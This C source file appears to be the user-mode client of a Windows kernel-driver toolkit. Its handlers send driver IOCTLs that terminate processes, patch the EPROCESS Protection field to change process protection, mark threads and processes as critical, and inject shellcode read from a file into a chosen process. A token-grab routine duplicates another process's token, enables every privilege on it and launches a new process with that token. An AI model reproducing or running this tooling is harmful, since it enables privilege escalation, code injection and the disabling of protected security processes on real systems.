#include "../Main.h"

int GetSystemBuildNumber()
{
    wchar_t valueData[32] = { 0 };
	DWORD valueDataSize = sizeof(valueData);

    LONG regGetValueReturnValue = RegGetValueW(
        HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
        L"CurrentBuildNumber",
        RRF_RT_REG_SZ,
        NULL,
        valueData,
        &valueDataSize);

    if(regGetValueReturnValue != ERROR_SUCCESS)
    {
        ERR("Failed to read CurrentBuildNumber from registry, error code: %ld", regGetValueReturnValue);

        return 0;
    }

    return _wtoi(valueData);
}

// Calculates and returns the offset of the Protection member in the EPROCESS struct (relative to the start address of the EPROCESS struct)
ULONG GetEprocessProtectionMemberOffset()
{
	ULONG offset = 0;
	switch (GetSystemBuildNumber())
	{
	case NT_WIN8_BLUE:
		offset = PsProtectionOffset_9600;
		break;
	case NT_WIN10_THRESHOLD1:
		offset = PsProtectionOffset_10240;
		break;
	case NT_WIN10_THRESHOLD2:
		offset = PsProtectionOffset_10586;
		break;
	case NT_WIN10_REDSTONE1:
		offset = PsProtectionOffset_14393;
		break;
	case NT_WIN10_REDSTONE2:
	case NT_WIN10_REDSTONE3:
	case NT_WIN10_REDSTONE4:
	case NT_WIN10_REDSTONE5:
	case NT_WIN10_19H1:
	case NT_WIN10_19H2:
		offset = PsProtectionOffset_15063;
		break;

	// This is a wild example of how microsoft gets more and more lazy with new updates
	case NT_WIN10_20H1:
	case NT_WIN10_20H2:
	case NT_WIN10_21H1:
	case NT_WIN10_21H2:
	case NT_WIN10_22H2:
	case NT_WIN11_21H2:
	case NT_WIN11_22H2:
	case NT_WIN11_23H2:
	case NT_WIN11_24H2:
		offset = PsProtectionOffset_19041;
		break;

	default:
		offset = 0;
		break;
	}

	return offset;
}

BOOL TerminateProcessToyHandler(LPWSTR arguments[], UINT argumentCount)
{
    ULONG processPid = wcstoul(arguments[1], 0, 10);

    if(processPid == 0)
    {
        ERR("Invalid PID '%ls'", arguments[1]);

        return FALSE;
    }

    INFO("Sending device control to terminate process %lu...", processPid);

    return DeviceControlDriver(IOCTL_TERMINATE_PROCESS, &processPid, sizeof(processPid), NULL, 0);
}

BOOL ProtectProcessToyHandler(LPWSTR arguments[], UINT argumentCount)
{
    PROTECT_PROCESS_PARAMETER pplParameters = { 0 };
    ULONG psProtectionOffset = 0;
    ULONG targetProcessPid = 0;
    UINT protectionLevel = 0;

    if (argumentCount > 3)
    {
        psProtectionOffset = wcstoul(arguments[3], NULL, 16);

        if (psProtectionOffset == 0)
        {
            ERR("Invalid protection offset '%ls'", arguments[3]);

            return FALSE;
        }
    }
    else
    {
        psProtectionOffset = GetEprocessProtectionMemberOffset();
    }

    if (psProtectionOffset == 0)
    {
        ERR("Failed to automatically retrieve the EPROCESS Protection member offset, please specify it manually");

        return FALSE;
    }

    INFO("Using EPROCESS Protection member offset 0x%lx", psProtectionOffset);

    targetProcessPid = wcstoul(arguments[1], 0, 10);

    if (targetProcessPid == 0)
    {
        ERR("Invalid PID '%ls'", arguments[1]);

        return FALSE;
    }

    if (wcsicmp(arguments[2], L"none") == 0)
    {
        protectionLevel = 0;
    }
    else if (wcsicmp(arguments[2], L"light") == 0)
    {
        protectionLevel = 1;
    }
    else if (wcsicmp(arguments[2], L"full") == 0)
    {
        protectionLevel = 2;
    }
    else if (wcsicmp(arguments[2], L"max") == 0)
    {
        protectionLevel = 3;
    }
    else
    {
        ERR("Invalid protection level '%ls'", arguments[2]);

        return FALSE;
    }

    pplParameters.Pid = targetProcessPid;
    pplParameters.Level = protectionLevel;
    pplParameters.ProtectionOffset = psProtectionOffset;

    INFO("Sending device control to patch protection of process %lu...", targetProcessPid);

    return DeviceControlDriver(IOCTL_PROTECT_PROCESS, &pplParameters, sizeof(pplParameters), NULL, 0);
}

BOOL CriticalThreadToyHandler(LPWSTR arguments[], UINT argumentCount)
{
    CRITICAL_THREAD_PARAMETER deviceControlParameters = { 0 };
    ULONG tid;
    INT critical = FALSE;


    tid = wcstoul(arguments[1], NULL, 10);

    if (tid == 0)
    {
        ERR("Invalid thread id '%ls'", arguments[1]);
        return FALSE;
    }

    if (wcsicmp(arguments[2], L"true") == 0)
    {
        critical = TRUE;
    }
    else if (wcsicmp(arguments[2], L"false") == 0)
    {
        critical = FALSE;
    }
    else
    {
        ERR("Invalid boolean value '%ls', use 'true' / 'false'", arguments[2]);

        return FALSE;
    }

    deviceControlParameters.Critical = critical;
    deviceControlParameters.Tid = tid;

    INFO("Sending device control to set thread information of thread %ld...", tid);

    return DeviceControlDriver(IOCTL_CRITICAL_THREAD, &deviceControlParameters, sizeof(deviceControlParameters), NULL, 0);
}

BOOL MinimalProcessToyHandler(LPWSTR arguments[], UINT argumentCount)
{
    INFO("Sending device control to create minimal process '%ls'", arguments[1]);

	return DeviceControlDriver(IOCTL_MINIMAL_PROCESS, arguments[1], (wcslen(arguments[1]) + 1) * sizeof(WCHAR), NULL, 0);
}

BOOL InjectShellcodeToyHandler(LPWSTR arguments[], UINT argumentCount)
{
    INJECT_SHELLCODE_PARAMETER deviceControlParameters = { 0 };
    LARGE_INTEGER shellcodeFileSize     = { 0 };
    ULONG         targetProcessPid      = 0;
    HANDLE        shellcodeFileHandle   = NULL;
    PVOID         shellcodeBuffer       = NULL;
    DWORD         bytesRead             = 0;
    BOOL          returnValue           = TRUE;

    targetProcessPid = wcstoul(arguments[1], NULL, 10);

    if(targetProcessPid == 0)
    {
        ERR("Invalid PID '%ls'", arguments[1]);

        return FALSE;
    }

    shellcodeFileHandle = CreateFileW(
                arguments[2],
                GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL);

    if(shellcodeFileHandle == INVALID_HANDLE_VALUE)
    {
        DWORD lastError = GetLastError();

        if(lastError == ERROR_FILE_NOT_FOUND)
        {
            ERR("Could not locate file '%ls'", arguments[2]);
        }
        else
        {
            ERR("Failed to open file '%ls', lasterror: %ld", arguments[2], lastError);
        }

        return FALSE;
    }

    if(!GetFileSizeEx(shellcodeFileHandle, &shellcodeFileSize))
    {
        ERR("Failed to get file size of '%ls'", arguments[2]);

        CloseHandle(shellcodeFileHandle);

        return FALSE;
    }

    shellcodeBuffer = malloc(shellcodeFileSize.QuadPart);

    if(shellcodeBuffer == NULL)
    {
        ERR("Failed to allocate heap memory for shellcode buffer");

        CloseHandle(shellcodeFileHandle);

        return FALSE;
    }


    if(!ReadFile(shellcodeFileHandle, shellcodeBuffer, shellcodeFileSize.QuadPart, &bytesRead, NULL))
    {
        ERR("Failed to read data from file '%ls', lasterror: %ld", arguments[2], GetLastError());

        free(shellcodeBuffer);
        CloseHandle(shellcodeFileHandle);

        return FALSE;
    }

    CloseHandle(shellcodeFileHandle);

    if(bytesRead != shellcodeFileSize.QuadPart)
    {
        ERR("Bytes read (%ld) don't equal target file size (%lld)", bytesRead, shellcodeFileSize.QuadPart);

        free(shellcodeBuffer);

        return FALSE;
    }

    deviceControlParameters.ShellcodeBuffer = shellcodeBuffer;
    deviceControlParameters.ShellcodeBufferSizeBytes = bytesRead;
    deviceControlParameters.Pid = targetProcessPid;

    returnValue = DeviceControlDriver(IOCTL_INJECT_SHELLCODE, &deviceControlParameters, sizeof(deviceControlParameters), NULL, 0);

    free(shellcodeBuffer);

    return returnValue;
}


BOOL CriticalProcessToyHandler(LPWSTR arguments[], UINT argumentCount)
{
    HANDLE targetProcessHandle = NULL;
    HANDLE ownTokenHandle = NULL;
    ULONG targetProcessPid = 0;
    ULONG critical = FALSE;

    if (wcsicmp(arguments[2], L"true") == 0)
    {
        critical = TRUE;
    }
    else if (wcsicmp(arguments[2], L"false") == 0)
    {
        critical = FALSE;
    }
    else
    {
        ERR("Invalid boolean value '%ls'", arguments[2]);

        return FALSE;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &ownTokenHandle))
    {
        ERR("Failed to open own process token, lasterror: %ld", GetLastError());
        return FALSE;
    }

    if (!AdjustPrivilegeForToken(ownTokenHandle, L"SeDebugPrivilege"))
    {
        CloseHandle(ownTokenHandle);
        return FALSE;
    }

    CloseHandle(ownTokenHandle);

    targetProcessPid = wcstoul(arguments[1], NULL, 10);

    if (targetProcessPid == 0)
    {
        ERR("Invalid PID '%ls'", arguments[1]);

        return FALSE;
    }

    INFO("Opening target process...");

    targetProcessHandle = OpenProcess(PROCESS_SET_INFORMATION, 0, targetProcessPid);

    if (targetProcessHandle == NULL)
    {
        ERR("Failed to open target process %lu, lasterror: %ld", targetProcessPid, GetLastError());
        
        return FALSE;
    }

    NTSTATUS status = NtSetInformationProcess(targetProcessHandle, (PROCESS_INFORMATION_CLASS)ProcessBreakOnTermination, &critical, sizeof(critical));

    CloseHandle(targetProcessHandle);

    if(status != 0)
    {
        ERR("Failed to set process information, ntstatus: %08lX", status);

        return FALSE;
    }

    return TRUE;
}

BOOL TokengrabToyHander(LPWSTR arguments[], UINT argumentCount)
{
    HANDLE targetProcessHandle         = NULL; 
    HANDLE targetProcessTokenHandle    = NULL;
    HANDLE targetProcessTokenHandleDup = NULL;
    HANDLE ownTokenHandle              = NULL;
    STARTUPINFOW processStartupInfo    = { 0 };
    PROCESS_INFORMATION processInfo    = { 0 };
    ULONG targetProcessPid             = 0;

    LPWSTR privilegeNameList[] =
    {
        L"SeCreateTokenPrivilege",
        L"SeAssignPrimaryTokenPrivilege",
        L"SeLockMemoryPrivilege",
        L"SeIncreaseQuotaPrivilege",
        L"SeMachineAccountPrivilege",
        L"SeTcbPrivilege",
        L"SeSecurityPrivilege",
        L"SeTakeOwnershipPrivilege",
        L"SeLoadDriverPrivilege",
        L"SeSystemProfilePrivilege",
        L"SeSystemtimePrivilege",
        L"SeProfileSingleProcessPrivilege",
        L"SeIncreaseBasePriorityPrivilege",
        L"SeCreatePagefilePrivilege",
        L"SeCreatePermanentPrivilege",
        L"SeBackupPrivilege",
        L"SeRestorePrivilege",
        L"SeShutdownPrivilege",
        L"SeDebugPrivilege",
        L"SeAuditPrivilege",
        L"SeSystemEnvironmentPrivilege",
        L"SeChangeNotifyPrivilege",
        L"SeRemoteShutdownPrivilege",
        L"SeUndockPrivilege",
        L"SeSyncAgentPrivilege",
        L"SeEnableDelegationPrivilege",
        L"SeManageVolumePrivilege",
        L"SeImpersonatePrivilege",
        L"SeCreateGlobalPrivilege",
        L"SeTrustedCredManAccessPrivilege",
        L"SeRelabelPrivilege",
        L"SeIncreaseWorkingSetPrivilege",
        L"SeTimeZonePrivilege",
        L"SeCreateSymbolicLinkPrivilege",
        L"SeDelegateSessionUserImpersonatePrivilege"
    };

    targetProcessPid = wcstoul(arguments[1], NULL, 10);

    if (!targetProcessPid)
    {
        ERR("Invalid PID '%ls'", arguments[1]);

        return FALSE;
    }

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &ownTokenHandle))
    {
        ERR("Failed to open own process token, lasterror: %ld", GetLastError());

        return FALSE;
    }

    /*
        Enable SeDebugPrivilege for the ability to open any process except PP(L)s
    */
    INFO("Enabling SeDebugPrivilege for own token...");

    if (!AdjustPrivilegeForToken(ownTokenHandle, L"SeDebugPrivilege"))
    {
        CloseHandle(ownTokenHandle);
        return FALSE;
    }

    CloseHandle(ownTokenHandle);

    INFO("Opening target process %lu...", targetProcessPid);

    targetProcessHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, targetProcessPid);

    if (targetProcessHandle == NULL)
    {
        ERR("Failed to open target process %lu, lasterror: %lu", targetProcessPid, GetLastError());
        
        return FALSE;
    }


    if (!OpenProcessToken(targetProcessHandle, TOKEN_DUPLICATE, &targetProcessTokenHandle))
    {
        ERR("Failed to open target process token, lasterror %lu", GetLastError());

        CloseHandle(targetProcessHandle);
        return FALSE;
    }

    CloseHandle(targetProcessHandle);


    if (!DuplicateTokenEx(targetProcessTokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &targetProcessTokenHandleDup))
    {
        ERR("Failed to duplicate target process token, lasterrror %lu", GetLastError());

        CloseHandle(targetProcessTokenHandle);
        return FALSE;
    }

    CloseHandle(targetProcessTokenHandle);

    /* 
        User specified privileges / all privileges handler, this is some extremely bad nesting
    */
    if (argumentCount > 3)
    {
        if (!wcsicmp(arguments[3], L"allprivileges") || !wcsicmp(arguments[3], L"-allprivileges"))
        {
            INFO("Enabling all privileges for new process token...");

            for (UINT i = 0; i < ARRAYSIZE(privilegeNameList); i++)
            {
                if (AdjustPrivilegeForToken(targetProcessTokenHandleDup, privilegeNameList[i]))
                {
                    OK("Added '%ls'", privilegeNameList[i]);
                }
                else
                {
                    ERR("Failed to add '%ls'", privilegeNameList[i]);
                }
            }
        }
        else
        {
            INFO("Enabling selected privileges for new process token...");

            LPWSTR userPrivilegeList = _wcsdup(arguments[3]); // CAREFUL: ---- HIDDEN MALLOC IN WCSDUP
            
          
            LPWSTR currentPrivilege = wcstok(userPrivilegeList, L",");
            
            while(currentPrivilege != NULL)
            {

                if (AdjustPrivilegeForToken(targetProcessTokenHandleDup, currentPrivilege))
                {
                    OK("Added '%ls'", currentPrivilege);
                }
                else
                {
                    ERR("Failed to add '%ls'", currentPrivilege);
                }
                
                currentPrivilege = wcstok(NULL, L",");
            }

            free(userPrivilegeList);
        }
    }

    // Set the Desktop to Winsta0\Default, otherwise windows will we invisible
    processStartupInfo.lpDesktop = L"Winsta0\\Default";


    if (!CreateProcessWithTokenW(
        targetProcessTokenHandleDup,
        LOGON_WITH_PROFILE,
        arguments[2],
        NULL,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &processStartupInfo, 
        &processInfo))
    {
        ERR("Failed to create new process with token, lasterror %lu", GetLastError());

        CloseHandle(targetProcessTokenHandleDup);

        return FALSE;
    }

    CloseHandle(processInfo.hThread);
    CloseHandle(processInfo.hProcess);

    CloseHandle(targetProcessTokenHandleDup);

    return TRUE;
}
